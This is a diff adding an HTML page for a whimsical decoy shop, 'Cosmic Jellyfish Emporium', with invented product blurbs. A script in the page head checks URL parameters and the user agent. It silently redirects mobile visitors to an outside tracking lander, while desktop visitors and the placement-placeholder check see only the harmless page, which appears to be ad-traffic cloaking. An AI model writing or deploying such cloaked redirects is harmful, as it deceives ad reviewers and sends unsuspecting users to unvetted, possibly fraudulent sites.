@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        .box {
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            padding: 20px;
+            transform: skew(-5deg);
+        }
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Emporium</h1>
+    </header>
+    <div class="container">
+        <div class="box">
+            <h2>Bioluminescent Tentacles</h2>
+            <p>Our specialty: glow-in-the-dark jellyfish tentacles for all your cosmic needs!</p>
+        </div>
+        <div class="box">
+            <h2>Interstellar Jelly Jars</h2>
+            <p>Capture the essence of the universe in our specially designed jelly jars.</p>
+        </div>
+        <div class="box">
+            <h2>Nebula Nourishment</h2>
+            <p>Feed your cosmic jellyfish with our patented nebula-flavored plankton.</p>
+        </div>
+        <div class="box">
+            <h2>Gravity-Defying Aquariums</h2>
+            <p>Experience the wonder of floating jellyfish in our zero-gravity tanks!</p>
+        </div>
+        <div class="box">
+            <h2>Jellyfish Divination</h2>
+            <p>Let our psychic jellyfish predict your future. 100% accuracy or your money back!</p>
+        </div>
+        <div class="box">
+            <h2>Tentacle Massage Therapy</h2>
+            <p>Relax with our soothing jellyfish tentacle massages. No stings guaranteed!</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
